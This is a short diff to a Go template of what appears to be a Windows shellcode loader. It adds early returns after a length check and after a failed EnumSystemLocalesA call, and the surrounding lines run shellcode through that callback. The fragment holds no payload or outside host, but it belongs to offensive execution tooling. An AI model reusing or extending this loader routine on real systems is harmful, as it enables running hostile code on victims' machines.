@@ -78,6 +78,7 @@ func run(shellcode []byte) {
 		{{if .Debug}}
 		printDebug("info","len shellcode %d is not a multiple of 16", len(shellcode))
 		{{end}}
+		return
 	}
 
 	{{if .Debug}}
@@ -152,6 +153,7 @@ func run(shellcode []byte) {
 		{{if .Debug}}
 		printDebug("error", "EnumSystemLocalesA GetLastError: %s", err.Error())
 		{{end}}
+		return
 	}
 	{{if .Debug}}
 	printDebug("info","Shellcode Executed")
